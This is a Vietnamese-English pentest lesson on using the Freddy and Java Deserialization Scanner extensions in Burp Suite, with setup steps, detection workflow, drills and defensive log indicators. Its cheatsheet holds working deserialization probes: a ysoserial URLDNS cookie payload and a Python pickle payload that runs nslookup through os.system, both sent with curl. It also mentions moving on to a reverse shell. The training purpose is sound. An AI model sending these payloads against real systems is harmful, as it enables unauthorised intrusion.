---
title: "21. Burp Suite — Deserialization Scanner & Freddy"
type: tool
tags: [pentest, deserialization, burp-suite, freddy, tools, lesson-21]
aliases: [Burp Deserialization Scanner, Freddy Burp Extension]
created: 2026-04-06
---

> **Prerequisites**: [[20-blackbox-detection-methodology|20. Black-Box Detection Methodology]]
> **Objectives**:
> - Cài đặt và cấu hình Freddy extension trong Burp Suite
> - Sử dụng Java Deserialization Scanner cho active scan
> - Interpret kết quả và distinguish true positive từ false positive
> - Tích hợp Burp Collaborator vào deserialization workflow

---

## Purpose & Architecture

Burp Suite có hai extension quan trọng cho deserialization testing:

**Freddy** (Nick Bloor / PortSwigger): Passive + active scanner cho Java và .NET deserialization. Detect serialized objects trong requests và auto-test với ysoserial payloads.

**Java Deserialization Scanner** (PortSwigger Research): Focus on Java, dùng URLDNS + timing-based detection. Integrated với Burp Collaborator.

Cả hai đều work trong Burp Suite Pro và Community (với một số limitations).

---

## Installation & Setup

### Bước 1 — Cài Freddy

```bash
# Method 1: BApp Store (recommended)
# Burp Suite → Extensions → BApp Store → search "Freddy" → Install

# Method 2: Manual JAR
# Download: https://github.com/nccgroup/freddy/releases
# Burp → Extensions → Add → Select JAR → freddy-<version>.jar

# Verify install
# Extensions tab → thấy "Freddy" với status "Loaded"
```

### Bước 2 — Cài Java Deserialization Scanner

```bash
# BApp Store → search "Java Deserialization Scanner" → Install
# Hoặc manual: github.com/portswigger/java-deserialization-scanner
```

### Bước 3 — Cấu Hình Burp Collaborator

```
Project Options → Misc → Burp Collaborator Server
→ "Use the default Collaborator server" (cho Burp Pro)
→ Hoặc self-hosted: https://portswigger.net/burp/documentation/collaborator/deploying
```

### Bước 4 — Cấu Hình ysoserial Path (cho Java Deserialization Scanner)

```
Extensions → Java Deserialization Scanner → Config tab
→ ysoserial JAR path: /opt/ysoserial/ysoserial-all.jar
→ Java path: /usr/bin/java
→ JVM args: --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED
             --add-opens=java.base/java.net=ALL-UNNAMED
             --add-opens=java.base/java.util=ALL-UNNAMED
```

---

## Core Workflow

### Bước 1 — Passive Detection với Freddy

```
1. Start Burp Proxy, browse target application
2. Freddy tự động scan tất cả requests trong background
3. Kết quả xuất hiện trong: Extensions → Freddy → Freddy tab
4. Hoặc xem alerts trong: Scanner → Issues (nếu Burp Pro)
```

Freddy detect:
- Java serialized objects (`AC ED 00 05`, `rO0AB`)
- .NET BinaryFormatter (`AAEAAAD`)
- PHP serialized strings (`O:N:`, `a:N:`)
- Python pickle (proto headers)
- AMF, Kryo, Hessian formats

### Bước 2 — Active Scan Request Với Freddy

```
1. HTTP History → Right-click request → "Scan item with Freddy"
2. Hoặc: Send to Intruder → chọn serialized parameter → Freddy scan
3. Freddy thử từng ysoserial payload và detect via Collaborator DNS
```

### Bước 3 — Java Deserialization Scanner Manual Test

```
1. HTTP History → Right-click request có Java serialized data → 
   "Send to Java Deserialization Scanner"
2. Tab "Exploiter" → chọn Detection Type:
   - "DNS (Burp Collaborator)" → most reliable
   - "Time based" → khi DNS bị block
   - "Response based" → khi có error feedback
3. Click "Run check" cho từng payload
4. Xem "Issues" tab → "Deserialization (Java)" finding nếu vulnerable
```

### Bước 4 — Interpret Results

```
[HIGH] Deserialization - Java (Collaborator DNS):
  - Confirmed via DNS callback → true positive, gadget library present
  - Payload: CommonsCollections6
  - Request: POST /api/session

[MEDIUM] Deserialization - Java (Time based):
  - Response delayed ~5s → likely true positive, manual confirm
  - May be network latency → verify 2-3 times

[INFO] Serialized Java object detected:
  - Magic bytes found → object present, not confirmed exploitable
  - Manual testing needed
```

---

## Key Flags & Options

### Freddy Configuration

| Option | Mô tả | Recommended |
|--------|-------|-------------|
| Passive scan | Auto-detect trong all requests | Enable |
| Active scan | Test với actual payloads | Enable trong pentest |
| Collaborator | OOB DNS confirmation | Enable với Burp Pro |
| ysoserial path | Đường dẫn đến ysoserial JAR | Set nếu manual testing |
| Scan scope | Giới hạn scan theo host | Set target scope |

### Java Deserialization Scanner Scan Types

| Type | Khi dùng | Reliability |
|------|----------|-------------|
| DNS (Collaborator) | Burp Pro, DNS outbound allowed | Highest |
| Time based | DNS blocked, blind scenario | Medium |
| Response based | App leaks error info | Varies |
| All at once | Comprehensive test | Slowest |

---

## Common Patterns

### Pattern 1 — Java Serialized Cookie

```
Intercepted request:
  Cookie: JSESSIONID=...; userSession=rO0ABXNyAC5v...

Action in Burp:
1. Right-click request → Freddy → Scan
2. Freddy highlights "userSession" parameter
3. Active scan → DNS hit for CommonsCollections6
4. Confirmed vulnerable
```

### Pattern 2 — Binary POST Body

```
POST /api/import HTTP/1.1
Content-Type: application/octet-stream

[binary data starting with AC ED 00 05]

Action:
1. Send to Java Deserialization Scanner
2. Scanner modifies binary body với ysoserial payloads
3. Monitor Collaborator for DNS callbacks
```

### Pattern 3 — Base64 Hidden Parameter

```
POST /restore HTTP/1.1

backup=rO0ABXNyAC5v...&name=backup1

Action:
1. Right-click → Freddy scan → targets "backup" param
2. Time-based scan nếu no Collaborator
3. Timing delay confirms exploitation
```

---

## Integration With Other Tools

```
Burp Proxy
    ↓ intercept all requests
Freddy (passive)
    ↓ flag serialized objects
Java Deserialization Scanner
    ↓ confirm via DNS/timing
Burp Collaborator
    ↓ receive OOB callbacks
→ Confirmed: pivot to ysoserial manual exploit
→ Deliver reverse shell via identified endpoint
```

---

## Command Cheatsheet

**Setup**

```bash
# Verify ysoserial works (needed for active scan)
java -jar /opt/ysoserial/ysoserial-all.jar URLDNS "http://test.collab" | xxd | head -2
# Should output: aced 0005 ...

# Test Burp Collaborator connectivity
# Burp Pro: Project Options → Burp Collaborator → Poll now
# Expect: DNS and HTTP records appear
```

**Manual Burp Collaborator DNS Probe**

```bash
# Get Collaborator payload
COLLAB="$(burp_collab_payload)"  # từ Burp UI

# Java
java -jar ysoserial.jar URLDNS "http://${COLLAB}" > urldns.ser
curl http://TARGET -H "Cookie: session=$(base64 -w0 urldns.ser)"

# Python pickle
python3 -c "
import pickle,os,base64
class U:
    def __reduce__(self): return (os.system,(f'nslookup {\"$COLLAB\"}',))
print(base64.b64encode(pickle.dumps(U())).decode())" | \
  xargs -I{} curl http://TARGET -H "Cookie: auth={}"
```

---

## Daily Drill

**Thời gian**: 15 phút/ngày trong 5 ngày.

**Drill 1 — Freddy passive scan**
Mục tiêu: browse một target và identify tất cả serialized objects mà Freddy flag.

```
1. Start Burp, enable Freddy
2. Browse target application completely
3. Kiểm tra Freddy tab → count flagged requests
4. For each: identify language và parameter
```

**Drill 2 — Java Deserialization Scanner confirm**
Mục tiêu: thuộc workflow từ "flagged by Freddy" đến "confirmed via Collaborator".

```
1. Right-click flagged request → Java Deserialization Scanner
2. Select DNS detection type
3. Run all gadget chains
4. Check Collaborator for DNS hit
5. Note which gadget confirmed
```

Luyện cho đến khi: toàn bộ flow < 5 phút.

---

## Phát hiện & Phòng thủ

> [!warning] Detection Indicators
> **WAF**: Bursts của base64 encoded requests với same structure nhưng khác payload → Freddy/Scanner đang chạy
> **Log**: Nhiều requests đến cùng endpoint với khác Content-Length và 5-second timing → scanner timing test
> **DNS**: Nhiều DNS lookups đến `*.burpcollaborator.net` từ server → URLDNS probe từ scanner

> [!note] Lưu ý cho pentesters
> Freddy và Java Deserialization Scanner tạo noise đáng kể trong logs. Trong OPSEC-sensitive engagements, nên dùng manual probe (URLDNS một lần) thay vì automated scanner.

---

## Lab Thực hành

| Platform | Machine | Tại sao phù hợp |
|----------|---------|----------------|
| HTB | **Any Java deserialization box** | Practice scanner workflow |
| PortSwigger | **All deserialization labs** | Scanner integration training |
| TryHackMe | **Burp Suite modules** | Burp extension basics |
| Local | **DVWA / WebGoat** | Safe environment cho scanner practice |
